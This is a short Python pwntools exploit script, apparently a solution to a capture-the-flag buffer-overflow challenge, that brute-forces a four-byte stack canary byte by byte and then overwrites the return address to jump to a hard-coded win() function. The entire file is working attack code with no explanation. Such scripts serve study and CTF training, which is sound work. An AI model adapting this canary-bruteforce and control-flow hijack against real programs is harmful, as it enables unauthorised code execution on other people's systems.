#!/usr/bin/env python

from pwn import *

context.log_level = 'error'
filepath = '/problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf/vuln'

# 4 bytes of canary
canary = ''

# bruteforce canary byte by byte
for i in range(0, 4):
    for j in range(0, 0xff + 1):
        p = process(filepath)
        p.recvuntil('>')
        p.sendline(str(32 + i + 1))
        p.recvuntil('Input>')

        payload = 32 * 'A'
        payload += canary
        payload += p8(j)
        p.sendline(payload)
        output = p.recvall()

        if output.find('Stack') == -1:
            print('ok-->' + p8(j))
            canary += p8(j)
            break

        p.close()

print('[*] found canary: ' + canary)


p = process(filepath)
p.recvuntil('>')
p.sendline('100')
p.recvuntil('Input>')

payload = 32 * 'A'
payload += canary
payload += 16 * 'A'
#payload += "\xeb\x86\x04\x08" # win() addr
payload += p32(0x080486eb)
p.sendline(payload)
output = p.recvall()
print(output)
